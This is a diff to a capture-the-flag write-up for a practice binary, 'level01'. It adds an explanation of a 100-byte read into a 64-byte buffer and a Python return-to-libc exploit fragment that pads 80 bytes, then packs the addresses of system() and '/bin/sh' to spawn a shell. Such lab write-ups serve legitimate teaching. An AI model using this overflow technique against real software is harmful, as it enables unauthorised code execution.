@@ -1,19 +1,22 @@
 * In this level01 the program asks for a username , store it in a global variable/buffer called a_user_name 
 * call verify_user_name() to check using strncmp() if the username is equal to "dat_wil".
 * if the username is dat_wil the program asks for a password , else it return (1).
-* the password is stored on the buffer[64], and get passed to verify_user_pass(), this function compare if the password is equal to "admin" , and return accordingly.
-* wethere if we provide a correct password or not the program throw the msg "nope, incorrect password...\n", and return .
-*  
+* the program reads the password in buffer[64], and passes it to verify_user_pass(), this function compare if the password is equal to "admin" , and return accordingly.
+* whether we provide a correct password or not the program throw the msg "nope, incorrect password...\n", and return .
+* but the problem here is when we the program reads the password it can read up to 100 bytes, where the buffer is only 64.
+* so we can exploit this to overwrite the return address of the main which 80 bytes far from the start of the baffer.
+
+==> to solve this challenge i did return to libc attack.
 
 
 ----------------------------------------------------------------
 import struct
 
-padding = "A" * 80
+padding = "A" * 80 # this how far return address from the start of the buffer .
 
 
 system = struct.pack ("I", 0xf7e6aed0)
-
+ 
 return_after_system = "AAAA"
 
 bin_sh = struct.pack ("I", 0xf7f897ec)
